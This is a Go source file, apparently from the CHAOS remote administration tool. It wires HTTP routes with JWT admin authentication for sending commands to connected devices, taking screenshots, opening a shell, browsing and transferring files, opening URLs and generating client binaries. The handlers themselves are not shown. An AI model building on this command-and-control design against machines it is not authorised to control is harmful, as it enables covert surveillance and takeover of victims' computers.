package http

import (
	"github.com/gin-gonic/gin"
	"github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/internal/environment"
	"github.com/tiagorlampert/CHAOS/internal/middleware"
	"github.com/tiagorlampert/CHAOS/services/auth"
	"github.com/tiagorlampert/CHAOS/services/client"
	"github.com/tiagorlampert/CHAOS/services/device"
	"github.com/tiagorlampert/CHAOS/services/url"
	"github.com/tiagorlampert/CHAOS/services/user"
)

type httpController struct {
	Configuration  *environment.Configuration
	Logger         *logrus.Logger
	AuthMiddleware *middleware.JWT
	ClientService  client.Service
	AuthService    auth.Service
	UserService    user.Service
	DeviceService  device.Service
	UrlService     url.Service
}

func NewController(
	configuration *environment.Configuration,
	router *gin.Engine,
	log *logrus.Logger,
	authMiddleware *middleware.JWT,
	clientService client.Service,
	systemService auth.Service,
	userService user.Service,
	deviceService device.Service,
	urlService url.Service,
) {
	handler := &httpController{
		Configuration:  configuration,
		AuthMiddleware: authMiddleware,
		Logger:         log,
		ClientService:  clientService,
		AuthService:    systemService,
		UserService:    userService,
		DeviceService:  deviceService,
		UrlService:     urlService,
	}

	router.Use(apiCorsMiddleware())
	router.NoRoute(handler.noRouteHandler)
	router.GET("/health", handler.healthHandler)
	router.GET("/login", handler.loginHandler)
	router.POST("/auth", authMiddleware.LoginHandler)

	apiGroup := router.Group("/api/v1")
	{
		apiGroup.GET("/health", handler.apiHealthHandler)
		apiGroup.POST("/auth/login", handler.apiLoginHandler)
	}

	apiAuthGroup := apiGroup.Group("")
	apiAuthGroup.Use(authMiddleware.MiddlewareFunc())
	apiAuthGroup.Use(authMiddleware.AuthAdmin)
	{
		apiAuthGroup.GET("/devices", handler.apiGetDevicesHandler)
		apiAuthGroup.GET("/devices/:id", handler.apiGetDeviceHandler)
		apiAuthGroup.POST("/devices/:id/commands", handler.apiSendCommandHandler)
		apiAuthGroup.GET("/devices/:id/screenshot", handler.apiScreenshotHandler)
		apiAuthGroup.GET("/devices/:id/explorer", handler.apiExplorerHandler)
		apiAuthGroup.POST("/devices/:id/open-url", handler.apiOpenUrlHandler)
		apiAuthGroup.GET("/devices/:id/files", handler.apiDownloadFileHandler)
		apiAuthGroup.POST("/devices/:id/files", handler.apiUploadFileHandler)
		apiAuthGroup.DELETE("/devices/:id/files", handler.apiDeleteFileHandler)

		apiAuthGroup.GET("/targets", handler.apiListTargetsHandler)
		apiAuthGroup.POST("/clients", handler.apiBuildClientHandler)
		apiAuthGroup.GET("/clients/:filename", handler.apiDownloadClientHandler)
	}

	adminGroup := router.Group("")
	adminGroup.Use(authMiddleware.MiddlewareFunc())
	adminGroup.Use(authMiddleware.AuthAdmin) //require admin role token

	authGroup := router.Group("")
	authGroup.Use(authMiddleware.MiddlewareFunc())
	{
		adminGroup.GET("/", handler.getDevicesHandler)

		router.GET("/logout", authMiddleware.LogoutHandler)

		adminGroup.GET("/settings", handler.getSettingsHandler)
		adminGroup.GET("/settings/refresh-token", handler.refreshTokenHandler)

		adminGroup.GET("/profile", handler.getUserProfileHandler)
		adminGroup.POST("/user", handler.createUserHandler)
		adminGroup.PUT("/user/password", handler.updateUserPasswordHandler)

		authGroup.POST("/device", handler.setDeviceHandler)
		adminGroup.GET("/devices", handler.getDevicesHandler)

		authGroup.GET("/client", handler.clientHandler)
		adminGroup.POST("/command", handler.sendCommandHandler)

		adminGroup.GET("/shell", handler.shellHandler)

		adminGroup.GET("/generate", handler.generateBinaryGetHandler)
		adminGroup.POST("/generate", handler.generateBinaryPostHandler)

		adminGroup.GET("/explorer", handler.fileExplorerHandler)

		authGroup.GET("/download/:filename", handler.downloadFileHandler)
		authGroup.POST("/upload", handler.uploadFileHandler)

		adminGroup.POST("/open-url", handler.openUrlHandler)
	}
}
